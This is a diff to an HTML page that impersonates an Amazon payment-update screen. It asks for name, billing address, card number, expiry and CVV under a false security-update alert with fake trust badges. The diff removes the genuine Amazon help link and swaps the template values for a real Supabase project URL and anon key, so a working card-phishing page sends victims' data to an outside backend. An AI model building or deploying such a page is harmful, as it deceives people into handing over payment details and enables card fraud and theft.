@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Update Your Payment Method - Amazon</title>
+    <title>Amazon Update</title>
     <link href="https://fonts.googleapis.com/css2?family=Ember:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
@@ -52,11 +52,11 @@
     </div>
     <div class="container">
         <div class="alert">
-            <h3>Payment Method Update Required</h3>
-            <p>Your payment method on file needs to be updated for continued service. This is due to recent account security enhancements. Please update your information below to avoid any interruption.</p>
+            <h3>Update Required</h3>
+            <p>Your payment method on file needs to be updated. This is due to recent account security enhancements. Please update your information below to avoid any interruption.</p>
         </div>
         <div class="title">Update Payment Method</div>
-        <div class="subtitle">Securely update your payment information. All data is encrypted end-to-end.</div>
+        <div class="subtitle">Securely update your payment information.</div>
         <div class="secure-update">
             <i class="fas fa-shield-alt"></i>
             <p><strong>Secure Update:</strong> Your information is encrypted and protected using industry-standard security measures.</p>
@@ -64,26 +64,26 @@
         <form id="paymentForm">
             <div class="form-group">
                 <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" placeholder="John Doe" required>
+                <input type="text" id="fullName" required>
             </div>
             <div class="form-group">
                 <label for="billingAddress">Billing Address</label>
-                <input type="text" id="billingAddress" placeholder="123 Main St" required>
+                <input type="text" id="billingAddress" required>
             </div>
             <div class="row">
                 <div class="form-group">
                     <label for="billingCity">City</label>
-                    <input type="text" id="billingCity" placeholder="Anytown" required>
+                    <input type="text" id="billingCity" required>
                 </div>
                 <div class="form-group">
                     <label for="billingState">State</label>
-                    <input type="text" id="billingState" placeholder="CA" required>
+                    <input type="text" id="billingState" required>
                 </div>
             </div>
             <div class="row">
                 <div class="form-group">
                     <label for="billingZip">ZIP Code</label>
-                    <input type="text" id="billingZip" placeholder="12345" required>
+                    <input type="text" id="billingZip" required>
                 </div>
                 <div class="form-group">
                     <label for="billingCountry">Country</label>
@@ -99,20 +99,20 @@
             </div>
             <div class="form-group">
                 <label for="cardName">Name on Card</label>
-                <input type="text" id="cardName" placeholder="John Doe" required>
+                <input type="text" id="cardName" required>
             </div>
             <div class="form-group">
                 <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <input type="text" id="cardNumber" maxlength="19" required>
             </div>
             <div class="row">
                 <div class="form-group">
                     <label for="expiration">Expiration Date</label>
-                    <input type="text" id="expiration" placeholder="MM/YY" maxlength="5" required>
+                    <input type="text" id="expiration" maxlength="5" required>
                 </div>
                 <div class="form-group">
                     <label for="cvv">CVV</label>
-                    <input type="password" id="cvv" placeholder="123" maxlength="4" required>
+                    <input type="password" id="cvv" maxlength="4" required>
                 </div>
             </div>
             <div class="checkbox">
@@ -126,9 +126,7 @@
             </div>
             <button type="submit" id="submitBtn">Update Payment Method</button>
         </form>
-        <div class="help-link">
-            <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=201115620" target="_blank">Need help updating your payment method?</a>
-        </div>
+     
         <div class="badges">
             <div class="badge"><i class="fas fa-lock"></i> SSL Secured</div>
             <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" style="height:20px;"></div>
@@ -145,8 +143,8 @@
         import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
 
         // Supabase configuration - Replace with your actual project details
-        const supabaseUrl = 'https://your-project-id.supabase.co';
-        const supabaseAnonKey = 'your-anon-key';
+        const supabaseUrl = 'https://xesuvuhkgxibgysgwfnf.supabase.co';
+        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhlc3V2dWhrZ3hpYmd5c2d3Zm5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk4NDk2MDEsImV4cCI6MjA3NTQyNTYwMX0.k__3S2tX5BoF6Mtp9JgGbW6objILtE3zspXpU59mJH8';
         const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
         // Card number formatting
